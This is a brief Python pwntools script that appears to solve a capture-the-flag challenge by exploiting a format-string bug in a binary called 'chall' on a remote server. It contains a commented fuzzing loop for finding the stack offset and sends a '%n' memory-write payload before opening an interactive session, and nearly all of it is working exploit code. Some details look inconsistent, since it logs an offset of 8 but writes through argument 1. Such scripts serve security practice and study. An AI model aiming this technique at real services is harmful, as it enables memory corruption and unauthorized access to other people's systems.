#!usr/bin/python3
from pwn import *

exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = '108.136.148.181', 9008
io = remote(host, port)

# fuzzing
# for i in range(20):
#     io = process(exe)
#     io.sendlineafter(b'(Max 10 digits)', f'AAAA%{i}$lx'.encode())
#     io.recvline()
#     io.close()

# https://axcheron.github.io/exploit-101-format-strings/
payload = b'%10x%1$n'
info('offset found at 8')
info('target found at 11')
info('payload length: %#x', len(payload))

io.sendline(payload)
io.interactive()